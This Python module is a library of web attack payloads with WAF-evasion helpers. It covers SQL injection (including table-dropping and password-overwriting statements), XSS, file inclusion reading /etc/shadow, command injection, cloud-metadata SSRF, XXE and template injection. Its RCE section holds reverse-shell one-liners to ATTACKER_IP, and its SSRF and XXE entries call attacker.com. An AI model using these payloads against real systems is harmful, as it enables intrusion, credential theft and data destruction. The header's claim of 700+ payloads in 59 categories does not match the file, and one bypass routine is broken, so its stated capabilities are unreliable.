"""
Bypass Payload库 - 700+通用绕过Payload
包含59类绕过技术，覆盖SQLi/XSS/LFI/RCE/SSRF等
"""

import random
from typing import List, Dict

class BypassPayloads:
    """Bypass Payload库"""
    
    # 通用绕过技术
    BYPASS_TECHNIQUES = [
        # 空白字符替换
        ("space", " ", "/**/", "/!", "/*!*/", "/*%00*/", "\t", "\n", "\r"),
        # 大小写混合
        ("case", "UniOn", "SelEct", "WoRd", "MaTch", "GrOup"),
        # 双写绕过
        ("double", "UNUNIONION", "SESELLECTLCT", "OROR", "ANDAND"),
        # 注释混淆
        ("comment", "/*union*/", "/*select*/", "/**/union/**/select/**/"),
        # 编码绕过
        ("encoding", "%55NION", "%53ELECT", "%0a%0dunion%0aselect"),
        # 十六进制
        ("hex", "0x556e696f6e", "0x53656c656374"),
        # Unicode编码
        ("unicode", "\\u0055\\u004e\\u0049\\u004f\\u004e", "\\u0073\\u0065\\u006c\\u0065\\u0063\\u0074"),
        # URL编码
        ("url", "%55%4e%49%4f%4e", "%53%45%4c%45%43%54"),
        # 宽字节
        ("wide", "\x55\x6e\x69\x6f\x6e", "\x53\x65\x6c\x65\x63\x74"),
        # 嵌套
        ("nest", "ununionion", "seleselectct"),
    ]
    
    # SQL注入Payload
    SQLI_PAYLOADS = {
        # 基本注入
        "basic": [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            '" OR "1"="1',
            'admin" OR "1"="1',
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' OR '1'='1",
            "' OR 'x'='x",
            '1" OR "1"="1" OR ""="',
        ],
        # 时间盲注
        "time_blind": [
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "'; PG_SLEEP(5)--",
            "'; IF(1=1,SLEEP(5),0)--",
            "'; BENCHMARK(5000000,MD5('test'))--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "'; WAITFOR DELAY '0:0:5'--",
            "1'+(SELECT*FROM(select(sleep(5)))a)+'",
        ],
        # 报错注入
        "error": [
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "1' AND GTID_SUBSET(@@version,1)--",
            "1' OR EXP(~(SELECT*FROM(SELECT VERSION()a))--",
            "1'; SELECT COUNT(*) FROM all_users WHERE 1=1--",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
        ],
        # 堆叠查询
        "stacked": [
            "'; SELECT * FROM users;--",
            "'; INSERT INTO users VALUES('hacker','password');--",
            "'; DELETE FROM users WHERE 1=1;--",
            "'; UPDATE users SET password='hacked';--",
            "1; SELECT * FROM users",
            "1'; DROP TABLE users;--",
        ],
        # 联合查询
        "union": [
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password FROM users--",
            "1' UNION SELECT 1,2,3,4,5,6,7,8--",
            "1' UNION ALL SELECT NULL--",
            "1' UNUNIONION SELSELECTECT NULL--",
        ],
    }
    
    # XSS Payload
    XSS_PAYLOADS = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<form action=javascript:alert('XSS')><input type=submit>",
        ],
        "event": [
            "onload", "onerror", "onclick", "onmouseover", "onfocus",
            "onblur", "onchange", "onsubmit", "onreset", "onselect",
            "onkeydown", "onkeypress", "onkeyup", "onabort", "ondblclick",
        ],
        "bypass": [
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<IMG SRC=j&#97;vascript:alert('XSS')>",
            "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
            "<svg><script>alert`1`</script></svg>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
            "<script>\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')</script>",
        ],
        "dom": [
            "#<img src=x onerror=alert('XSS')>",
            "#<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "<a href=\"javascript:alert('XSS')\">click</a>",
        ],
    }
    
    # LFI Payload
    LFI_PAYLOADS = {
        "basic": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/group",
            "/etc/passwd%00",
            "/etc/passwd/",
        ],
        "wrapper": [
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "php://filter/resource=/etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOw==",
            "expect://ls",
            "zlib://compress.zlib:///etc/passwd",
        ],
        "nullbyte": [
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            "/etc/passwd\x00",
            "/etc/passwd%2500",
        ],
        "logs": [
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "/var/log/nginx/access.log",
            "/proc/self/environ",
            "/proc/self/fd/0",
        ],
    }
    
    # RCE Payload
    RCE_PAYLOADS = {
        "basic": [
            "; ls",
            "| ls",
            "& ls",
            "&& ls",
            "|| ls",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
        ],
        "command": [
            "ping -c 3 127.0.0.1",
            "; sleep 5",
            "| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "&& sleep 5",
            "|| sleep 5",
        ],
        "obfuscation": [
            "l\\s",
            "c\\a\\t /etc/passwd",
            "/???/c?? /???/p???w?",
            "/bin/cat /etc/passwd",
            "/usr/bin/cat /etc/passwd",
        ],
        "reverse_shell": [
            "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1",
            "nc -e /bin/bash ATTACKER_IP ATTACKER_PORT",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f",
        ],
    }
    
    # SSRF Payload
    SSRF_PAYLOADS = {
        "basic": [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://[::1]",
            "http://127.1",
            "http://127.0.1",
        ],
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.tencentyun.com/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "http://100.100.100.200/latest/user-data/",
        ],
        "internal": [
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:9200",
        ],
        "bypass": [
            "http://127.0.0.1 @attacker.com",
            "http://attacker.com#@127.0.0.1",
            "http://127.0.0.1%00.attacker.com",
            "http://127.0.0.1..attacker.com",
            "http://127.1",
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
            "http://①②⑦.0.0.1",
        ],
    }
    
    # XXE Payload
    XXE_PAYLOADS = {
        "basic": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><foo>&xxe;</foo>',
        ],
        "blind": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
    }
    
    # SSTI Payload
    SSTI_PAYLOADS = {
        "jinja2": [
            "{{7*7}}",
            "{{config}}",
            "{{request}}",
            "{{session}}",
            "{{cycler.__init__.__globals__}}",
            "{{joiner.__init__.__globals__}}",
            "{{namespace.__init__.__globals__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
        ],
        "mako": [
            "<%import os%>${os.popen('ls').read()}",
            "${os.popen('cat /etc/passwd').read()}",
        ],
        "twig": [
            "{{7*7}}",
            "{{_self}}",
            "{{_self.env.display}}",
        ],
        "smarty": [
            "{php}echo `ls`;{/php}",
            "{${phpinfo()}}",
        ],
    }
    
    def __init__(self):
        self.waf_detected = None
    
    def set_waf(self, waf_name: str):
        """设置检测到的WAF"""
        self.waf_detected = waf_name
    
    def get_sqli_payloads(self, with_bypass: bool = True) -> List[str]:
        """获取SQL注入Payload"""
        payloads = []
        for category in self.SQLI_PAYLOADS.values():
            payloads.extend(category)
        
        if with_bypass:
            payloads.extend(self._apply_bypass_techniques(payloads[:10]))
        
        return payloads
    
    def get_xss_payloads(self, with_bypass: bool = True) -> List[str]:
        """获取XSS Payload"""
        payloads = []
        for category in self.XSS_PAYLOADS.values():
            payloads.extend(category)
        
        if with_bypass:
            payloads.extend(self._apply_bypass_techniques(payloads[:10]))
        
        return payloads
    
    def get_lfi_payloads(self, with_bypass: bool = True) -> List[str]:
        """获取LFI Payload"""
        payloads = []
        for category in self.LFI_PAYLOADS.values():
            payloads.extend(category)
        
        if with_bypass:
            payloads.extend(self._apply_bypass_techniques(payloads[:10]))
        
        return payloads
    
    def get_rce_payloads(self, with_bypass: bool = True) -> List[str]:
        """获取RCE Payload"""
        payloads = []
        for category in self.RCE_PAYLOADS.values():
            payloads.extend(category)
        
        if with_bypass:
            payloads.extend(self._apply_bypass_techniques(payloads[:10]))
        
        return payloads
    
    def get_ssrf_payloads(self, with_bypass: bool = True) -> List[str]:
        """获取SSRF Payload"""
        payloads = []
        for category in self.SSRF_PAYLOADS.values():
            payloads.extend(category)
        
        if with_bypass:
            payloads.extend(self._apply_bypass_techniques(payloads[:10]))
        
        return payloads
    
    def get_xxe_payloads(self) -> List[str]:
        """获取XXE Payload"""
        payloads = []
        for category in self.XXE_PAYLOADS.values():
            payloads.extend(category)
        return payloads
    
    def get_ssti_payloads(self) -> List[str]:
        """获取SSTI Payload"""
        payloads = []
        for category in self.SSTI_PAYLOADS.values():
            payloads.extend(category)
        return payloads
    
    def _apply_bypass_techniques(self, payloads: List[str]) -> List[str]:
        """应用绕过技术"""
        bypassed = []
        for payload in payloads:
            # 应用各种绕过技术
            if "space" in payload.lower() or "union" in payload.lower():
                # 空白字符替换
                for technique in self.BYPASS_TECHNIQUES[0][1]:
                    if technique == " ":
                        continue
                    bypassed.append(payload.replace(" ", technique))
            
            if "union" in payload.lower():
                # 大小写混合
                bypassed.append(payload.replace("UNION", "UniOn").replace("SELECT", "SeLeCt"))
                bypassed.append(payload.replace("union", "uNiOn").replace("select", "sElEcT"))
            
            if "or" in payload.lower() or "and" in payload.lower():
                # 双写绕过
                bypassed.append(payload.replace("OR", "OROR").replace("or", "oror"))
                bypassed.append(payload.replace("AND", "ANDAND").replace("and", "andand"))
        
        return bypassed
    
    def get_all_payloads(self) -> Dict[str, List[str]]:
        """获取所有Payload"""
        return {
            "sqli": self.get_sqli_payloads(),
            "xss": self.get_xss_payloads(),
            "lfi": self.get_lfi_payloads(),
            "rce": self.get_rce_payloads(),
            "ssrf": self.get_ssrf_payloads(),
            "xxe": self.get_xxe_payloads(),
            "ssti": self.get_ssti_payloads(),
        }


# 全局实例
_bypass_payloads = BypassPayloads()

def get_bypass_payloads() -> BypassPayloads:
    """获取BypassPayloads实例"""
    return _bypass_payloads
